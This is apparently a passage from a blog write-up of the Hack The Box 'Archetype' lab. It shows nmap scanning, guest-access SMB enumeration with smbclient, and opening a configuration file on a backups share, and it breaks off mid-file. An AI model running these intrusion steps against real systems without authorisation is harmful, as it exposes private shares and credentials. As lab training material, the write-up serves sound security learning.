<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> openvpn /path/to/hack_the_box.ovpn</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Attempting to establish TCP connection with </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">AF_INET</span><span class="token punctuation" style="color:#393A34">]</span><span class="token number" style="color:#36acaa">1.222</span><span class="token plain">.333.222:443 </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">nonblock</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">TCP connection established with </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">AF_INET</span><span class="token punctuation" style="color:#393A34">]</span><span class="token number" style="color:#36acaa">1.222</span><span class="token plain">.333.222:443</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="enumeration">Enumeration<a href="https://kbbgl.github.io/blog/hack-the-box-archetype-challenge#enumeration" class="hash-link" aria-label="Direct link to Enumeration" title="Direct link to Enumeration">​</a></h2>
<p>To enumerate a target machine (IP <code>10.12.12.27</code>) is to list all possible ways we can use to hack into it. The best place to start is to scan the machine for open ports and try to detect the operating system so we can tailor our methods. To perform the scan, I used the standard way, <a href="https://nmap.org/" target="_blank" rel="noopener noreferrer"><code>nmap</code>, the network mapper</a>.
I executed the scan as follows as I found it gives a pretty verbose output and the scan is quite fast as well:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token assign-left variable" style="color:#36acaa">ip</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">"10.12.12.27"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap </span><span class="token parameter variable" style="color:#36acaa">-T4</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-A</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$ip</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-oN</span><span class="token plain"> nmap_scan.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The <code>-A</code> flag is to used to detect the operating system and version and <code>traceroute</code>.
The <code>-T4</code> flag is there to ensure that the scan is fast. The range is between <code>0-5</code> where the higher the number, the faster it scans.
The <code>-oN</code> flag tells the tool to save the scan to a file, in this case <code>nmap_scan.txt</code> in the same directory.
Reviewing the scan output, we see that that the machine is a 2019 Windows Server  and has a SQL Server 2017 instance listening on port 1433:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> nmap_scan.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PORT     STATE SERVICE      VERSION                                                                                                    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">135</span><span class="token plain">/tcp  </span><span class="token function" style="color:#d73a49">open</span><span class="token plain">  msrpc        Microsoft Windows RPC                                                                                      </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">139</span><span class="token plain">/tcp  </span><span class="token function" style="color:#d73a49">open</span><span class="token plain">  netbios-ssn  Microsoft Windows netbios-ssn                                                                              </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">445</span><span class="token plain">/tcp  </span><span class="token function" style="color:#d73a49">open</span><span class="token plain">  microsoft-ds Windows Server </span><span class="token number" style="color:#36acaa">2019</span><span class="token plain"> Standard </span><span class="token number" style="color:#36acaa">17763</span><span class="token plain"> microsoft-ds                                                            </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1433</span><span class="token plain">/tcp </span><span class="token function" style="color:#d73a49">open</span><span class="token plain">  ms-sql-s     Microsoft SQL Server </span><span class="token number" style="color:#36acaa">2017</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">14.00</span><span class="token plain">.1000.00</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> RTM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">. </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>If we scroll down a bit more, we can see that the target machine discovery was done using the <a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831795(v=ws.11)" target="_blank" rel="noopener noreferrer">SMB (Server Message Block)</a> running on port 445 which is a protocol for shared files and folders in a network:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> nmap_scan.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Host script results:                                               </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.                       </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> smb-security-mode:                                               </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain">   account_used: guest                                            </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain">   authentication_level: user                                     </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain">   challenge_response: supported                                  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain">_  message_signing: disabled </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">dangerous, but default</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>This is the protocol that allows us to access remote shared network drives from Windows Explorer by inserting <code>\\REMOTE_IP\SHARE_NAME</code> in the address bar. SMB is known to have many vulnerabilities (e.g. <a href="https://en.wikipedia.org/wiki/EternalBlue" target="_blank" rel="noopener noreferrer">EternalBlue</a>, <a href="https://msrc.microsoft.com/update-guide/vulnerability/ADV200005" target="_blank" rel="noopener noreferrer">ADV200005</a>) so my intuition guided me to use this protocol to gain more information about the system. Also, we can see pretty clearly that the guest user is enabled which inherently means that there’s no need for a password!</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="getting-credentials-using-smbclient">Getting Credentials using <code>smbclient</code><a href="https://kbbgl.github.io/blog/hack-the-box-archetype-challenge#getting-credentials-using-smbclient" class="hash-link" aria-label="Direct link to getting-credentials-using-smbclient" title="Direct link to getting-credentials-using-smbclient">​</a></h2>
<p>Now that we know that the SMB server is up, we need to find a way to connect and enumerate it. I found this <a href="https://unix.stackexchange.com/questions/65106/accessing-a-smb-share-without-a-password" target="_blank" rel="noopener noreferrer">UNIX StackExchange post</a> helpful as it mentioned that we can connect to the SMB server using a client called smbclient and it provided the arguments needed to connect without a password.
I found that I already had <code>smbclient</code> installed:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">which</span><span class="token plain"> smbclient</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/smbclient</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I attempted to connect to the SMB server using the following command:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">smbclient //</span><span class="token variable" style="color:#36acaa">$ip</span><span class="token plain">// </span><span class="token parameter variable" style="color:#36acaa">-U</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">" "</span><span class="token plain">%</span><span class="token string" style="color:#e3116c">" "</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>But I saw no output. It could be a positive since it means that I reached the server and no connection errors were thrown. But it seems that I was missing something to get it to display its contents.
I turned to reading the smbclient manual and found that there’s a way to list the server contents:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">man</span><span class="token plain"> smbclient</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-L</span><span class="token operator" style="color:#393A34">|</span><span class="token plain">--list                                                                                                                       </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">           This option allows you to </span><span class="token function" style="color:#d73a49">look</span><span class="token plain"> at what services are available on a server. You use it as smbclient </span><span class="token parameter variable" style="color:#36acaa">-L</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">host</span><span class="token plain"> and a list should appear.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Sounds promising. When I ran it, I got the following output:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">smbclient </span><span class="token parameter variable" style="color:#36acaa">-L</span><span class="token plain"> //</span><span class="token variable" style="color:#36acaa">$ip</span><span class="token plain">// </span><span class="token parameter variable" style="color:#36acaa">-U</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">" "</span><span class="token plain">%</span><span class="token string" style="color:#e3116c">" "</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                                                                                                                       </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Sharename       Type      Comment                                                                                              </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ---------       ----      -------                                                                                              </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ADMIN$          Disk      Remote Admin                                                                                         </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        backups         Disk                                                                                                           </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        C$              Disk      Default share                                                                                        </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        IPC$            IPC       Remote IPC                                                                                           </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SMB1 disabled -- no workgroup available</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>So we can see that we have 4 shared drives here, 3 of them are disks and one of them is used for <a href="https://en.wikipedia.org/wiki/Inter-process_communication" target="_blank" rel="noopener noreferrer">Inter Process Communications (IPC)</a>. The IPC enables users to enumerate network shares and is created by default by the system (<a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/inter-process-communication-share-null-session" target="_blank" rel="noopener noreferrer">source</a>). So I needed to focus on trying to access the disk shares as the IPC is the share that allows us to perform the enumeration in the first place. The $ suffix in the share name indicates it’s the share is hidden.
To access the share, I removed the <code>-L</code> flag and ran the following command to attempt to access the <code>ADMIN</code> share:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">smbclient //</span><span class="token variable" style="color:#36acaa">$ip</span><span class="token plain">//ADMIN$ </span><span class="token parameter variable" style="color:#36acaa">-U</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">" "</span><span class="token plain">%</span><span class="token string" style="color:#e3116c">" "</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tree connect failed: NT_STATUS_ACCESS_DENIED</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Same for the <code>C$</code> share (which is the <code>C</code> drive):</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">smbclient //</span><span class="token variable" style="color:#36acaa">$ip</span><span class="token plain">//C$ </span><span class="token parameter variable" style="color:#36acaa">-U</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">" "</span><span class="token plain">%</span><span class="token string" style="color:#e3116c">" "</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tree connect failed: NT_STATUS_ACCESS_DENIED</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>This indicates that the guest user doesn’t have access to these shares. But, we attempting to access the backups share, we were introduced with a shell!</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">smbclient //</span><span class="token variable" style="color:#36acaa">$ip</span><span class="token punctuation" style="color:#393A34">\</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">backups </span><span class="token parameter variable" style="color:#36acaa">-U</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">" "</span><span class="token plain">%</span><span class="token string" style="color:#e3116c">" "</span><span class="token plain">                                                                                             </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Try </span><span class="token string" style="color:#e3116c">"help"</span><span class="token plain"> to get a list of possible commands.                                                                                         </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">smb: </span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">  </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I typed ‘help’ in the command prompt and found that the majority of the commands were pretty standard shell commands. For instance, I wanted to list the contents of the folder:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">smb: </span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">dir</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token builtin class-name">.</span><span class="token plain">                                   D        </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  Mon Jan </span><span class="token number" style="color:#36acaa">20</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">14</span><span class="token plain">:20:57 </span><span class="token number" style="color:#36acaa">2020</span><span class="token plain">                                                             </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">                                  D        </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  Mon Jan </span><span class="token number" style="color:#36acaa">20</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">14</span><span class="token plain">:20:57 </span><span class="token number" style="color:#36acaa">2020</span><span class="token plain">                                                             </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  prod.dtsConfig                     AR      </span><span class="token number" style="color:#36acaa">609</span><span class="token plain">  Mon Jan </span><span class="token number" style="color:#36acaa">20</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">14</span><span class="token plain">:23:02 </span><span class="token number" style="color:#36acaa">2020</span><span class="token plain">                                                             </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                                                                                                                        </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token number" style="color:#36acaa">10328063</span><span class="token plain"> blocks of size </span><span class="token number" style="color:#36acaa">4096</span><span class="token plain">. </span><span class="token number" style="color:#36acaa">8253724</span><span class="token plain"> blocks available </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I found that there’s some type of configuration file named ‘prod.dtsConfig‘ there. To read its contents, I used the following command:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">smb: </span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">more</span><span class="token plain"> prod.dtsConfig</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-markup codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-markup codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">DTSConfiguration</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">                                                                                                                     </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">DTSConfigurationHeading</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">                                                                                                          </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">DTSConfigurationFileInfo</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">GeneratedBy</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag attr-value" style="color:#e3116c">...</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">GeneratedFromPackageName</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag attr-value" style="color:#e3116c">...</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">GeneratedFromPackageID</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag attr-value" style="color:#e3116c">...</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">GeneratedDate</span><span class="token tag attr-value punctuation attr-equals" 